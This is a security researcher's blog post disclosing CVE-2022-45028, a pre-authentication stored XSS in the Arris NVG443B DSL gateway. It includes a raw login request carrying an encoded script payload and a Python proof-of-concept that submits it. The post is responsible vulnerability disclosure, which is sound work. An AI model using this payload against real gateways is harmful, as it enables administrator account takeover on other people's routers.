=== Content from seanpesce.blogspot.com_6d98fc03_20250114_224224.html ===
[Mastodon](https://infosec.exchange/%40SeanPesce)

# [SP](https://seanpesce.blogspot.com/)

Sean Pesce's Research Blog

## Friday, November 4, 2022

### [CVE-2022-45028] Unauthenticated Stored XSS in the Arris NVG443B

**Update:** I reported this vulnerability to MITRE on November 4th, 2022. It has been assigned [CVE-2022-45028](https://nvd.nist.gov/vuln/detail/CVE-2022-45028) with a CVSS score of 6.1 (Medium).

---

The [Arris NVG443B DSL Gateway](https://www.amazon.com/802-11ac-Frontier-Formerly-Firmware-Wireless-AC/dp/B084BT8WP1) (distributed by [Frontier Communications](https://frontier.com/)) running firmware version 9.3.0h3d36 is affected by a pre-authenticated stored Cross-site Scripting (XSS) vulnerability in the configuration web interface. The vulnerability likely affects other firmware versions and Arris products, but I have only confirmed the existence of the issue in the NVG443B.

I first discovered the vulnerability on July 20, 2022, and an Arris/CommScope employee confirmed (via email) that they fixed the vulnerability sometime between then and October 18, 2022:

> “*The CommScope Engineering team confirmed the existence of the vulnerability and the patch has been released.*”

Unfortunately the employee didn't clarify what firmware version contains the fix.

At the time of discovery, [Shodan](https://www.shodan.io/search?query=%229.3.0h3d36%22) indicated that several thousand of these devices were exposed to the internet and running the vulnerable firmware version.

---

**Exploitation**

The username field of a POST request can be used to deliver an XSS payload. An attacker can send an HTTP request such as the following to /cgi-bin/login.ha:

```
POST /cgi-bin/login.ha HTTP/1.1
Host: 192.168.254.254
Content-Length: 224
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36

nonce=8b277da8000e57ef989565d34d8479ce3fcb33edee9e25ad&username=%22%2f%3e%0a%3c%69%6d%67%20%73%72%63%3d%65%72%72%20%6f%6e%65%72%72%6f%72%3d%22%61%6c%65%72%74%28%31%29%22%2f%3e%3c%62%72&password=1111111111&Continue=Continue

```

The next time a user navigates to /cgi-bin/logs.ha, the XSS will be triggered:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEj4_YIrG61c2ZuogpP83Pf7E76LTA50GMPr-amTj6B8o1m736CwC1DXb3EnNUfldLhOuts6bjg91kxCgYe2O9FRNhVFWZXq2dGK7X9fBofNhqt5epxY-wX346pjq8RsesmQkFfMXVt2CBdyQ6TMmYR7bppwGsa1l4RWiSxuUVOENR1yDAGYfhk7N3pBeg)](https://blogger.googleusercontent.com/img/a/AVvXsEj4_YIrG61c2ZuogpP83Pf7E76LTA50GMPr-amTj6B8o1m736CwC1DXb3EnNUfldLhOuts6bjg91kxCgYe2O9FRNhVFWZXq2dGK7X9fBofNhqt5epxY-wX346pjq8RsesmQkFfMXVt2CBdyQ6TMmYR7bppwGsa1l4RWiSxuUVOENR1yDAGYfhk7N3pBeg)

This vulnerability can be leveraged to perform actions such as changing the account password for the web interface administrator.

---

**Proof of Concept**

The following Python script is a PoC demonstrating the XSS. Simply run this script on the same LAN as an Arris NVG443B with the 9.3.0h3d36 firmware, and then navigate to http://192.168.254.254/cgi-bin/logs.ha to trigger the XSS (a benign alert dialog).

```
#!/usr/bin/env python3
# Author: Sean Pesce

# Required Python 3 libraries:
#     requests

import requests
import socket
import sys
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NVG443B_DEFAULT_IP = '192.168.254.254'

def get_nonce(host):
    url = f'http://{host}/cgi-bin/login.ha'
    canary = b'nonce" value="'
    response = requests.get(url, verify=False)
    data = response.content
    nonce_pos = data.index(canary) + len(canary)
    data = data[nonce_pos:]
    data = data.split(b'"')[0]
    data = data.decode('ascii')
    return data

def do_xss(host, nonce):
    url = f'http://{host}/cgi-bin/login.ha'
    body = f'nonce={nonce}&username=%22%2f%3e%0a%3c%69%6d%67%20%73%72%63%3d%65%72%72%20%6f%6e%65%72%72%6f%72%3d%22%61%6c%65%72%74%28%27%53%65%61%6e%50%20%7c%20%58%53%53%27%29%22%2f%3e%3c%62%72&password=1111111111&Continue=Continue'
    response = requests.post(url, verify=False, data=body)
    return response

if __name__ == '__main__':
    if '-h' in sys.argv or '--help' in sys.argv:
        print(f'Usage:\n\tpython3 {sys.argv[0]} [host]\n\nhost: The hostname or IP address of an Arris NVG443B. If none is provided, the default value is {NVG443B_DEFAULT_IP}')
        sys.exit()

    HOST = NVG443B_DEFAULT_IP
    if len(sys.argv) > 1:
        HOST = sys.argv[1]

    NONCE = get_nonce(HOST)
    print(f'nonce={NONCE}')
    response = do_xss(HOST, NONCE)
    print(response)
    print(f'\nDone. Navigate to http://{HOST}/cgi-bin/logs.ha to trigger the XSS.')

```

at

[November 04, 2022](https://seanpesce.blogspot.com/2022/11/unauthenticated-stored-xss-in-arris.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=6232022754684573309&postID=6449689316693595952&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=6232022754684573309&postID=6449689316693595952&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=6232022754684573309&postID=6449689316693595952&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=6232022754684573309&postID=6449689316693595952&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=6232022754684573309&postID=6449689316693595952&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=6232022754684573309&postID=6449689316693595952&target=pinterest "Share to Pinterest")

Labels:
[cve](https://seanpesce.blogspot.com/search/label/cve),
[device](https://seanpesce.blogspot.com/search/label/device),
[vulnerability](https://seanpesce.blogspot.com/search/label/vulnerability),
[web](https://seanpesce.blogspot.com/search/label/web),
[xss](https://seanpesce.blogspot.com/search/label/xss)

#### No comments:

#### Post a Comment

[Newer Post](https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html "Newer Post")

[Older Post](https://seanpesce.blogspot.com/2022/10/adding-support-for-flash-chip-in.html "Older Post")

[Home](https://seanpesce.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://seanpesce.blogspot.com/feeds/6449689316693595952/comments/default)

## Search This Blog

|  |  |
| --- | --- |

* [Home](https://seanpesce.blogspot.com/)

## About Me

[![My photo](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCZnUVMuRhFPiUy9elMuRPSS5VkfBETRGVvbQvrbmep4n1N30FKZfNwH_jDMKg5o5dQg0ypaWjBGE0Kdab7riAKg72hFwtPPXwgGQ4FhvR-lJyjYkhM_RsBCXNgNkgVA/s220/03%5B1%5D.jpg)](https://www.blogger.com/profile/18349249656099680276)
[SeanPesce](https://www.blogger.com/profile/18349249656099680276)

[View my complete profile](https://www.blogger.com/profile/18349249656099680276)

### [Report Abuse](https://www.blogger.com/go/report-abuse)

| Blog Archive  * [September 2024](https://seanpesce.blogspot.com/2024/09/) (1) * [May 2024](https://seanpesce.blogspot.com/2024/05/) (1) * [November 2023](https://seanpesce.blogspot.com/2023/11/) (1) * [May 2023](https://seanpesce.blogspot.com/2023/05/) (1) * [March 2023](https://seanpesce.blogspot.com/2023/03/) (1) * [November 2022](https://seanpesce.blogspot.com/2022/11/) (1) * [October 2022](https://seanpesce.blogspot.com/2022/10/) (1) * [October 2021](https://seanpesce.blogspot.com/2021/10/) (1) | Labels  * [account+takeover](https://seanpesce.blogspot.com/search/label/account%2Btakeover) * [android](https://seanpesce.blogspot.com/search/label/android) * [ato](https://seanpesce.blogspot.com/search/label/ato) * [aws](https://seanpesce.blogspot.com/search/label/aws) * [cloud](https://seanpesce.blogspot.com/search/label/cloud) * [cve](https://seanpesce.blogspot.com/search/label/cve) * [device](https://seanpesce.blogspot.com/search/label/device) * [firmware](https://seanpesce.blogspot.com/search/label/firmware) * [flash](https://seanpesce.blogspot.com/search/label/flash) * [iot](https://seanpesce.blogspot.com/search/label/iot) * [linux](https://seanpesce.blogspot.com/search/label/linux) * [mobile](https://seanpesce.blogspot.com/search/label/mobile) * [open+redirect](https://seanpesce.blogspot.com/search/label/open%2Bredirect) * [openssh](https://seanpesce.blogspot.com/search/label/openssh) * [privilege+escalation](https://seanpesce.blogspot.com/search/label/privilege%2Bescalation) * [reverse+engineering](https://seanpesce.blogspot.com/search/label/reverse%2Bengineering) * [selinux](https://seanpesce.blogspot.com/search/label/selinux) * [semgrep](https://seanpesce.blogspot.com/search/label/semgrep) * [server+side+request+forgery](https://seanpesce.blogspot.com/search/label/server%2Bside%2Brequest%2Bforgery) * [spring](https://seanpesce.blogspot.com/search/label/spring) * [ssrf](https://seanpesce.blogspot.com/search/label/ssrf) * [sudo](https://seanpesce.blogspot.com/search/label/sudo) * [uri](https://seanpesce.blogspot.com/search/label/uri) * [video+game](https://seanpesce.blogspot.com/search/label/video%2Bgame) * [vulnerability](https://seanpesce.blogspot.com/search/label/vulnerability) * [web](https://seanpesce.blogspot.com/search/label/web) * [xss](https://seanpesce.blogspot.com/search/label/xss) |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from drive.google.com_12150213_20250114_224222.html ===
[Sign in](https://accounts.google.com/ServiceLogin?service=wise&passive=1209600&osid=1&continue=https://drive.google.com/file/d/1AHqvciVNMQpUoomFgtctnByewkkr24kB/view&followup=https://drive.google.com/file/d/1AHqvciVNMQpUoomFgtctnByewkkr24kB/view&ec=GAZAGQ)
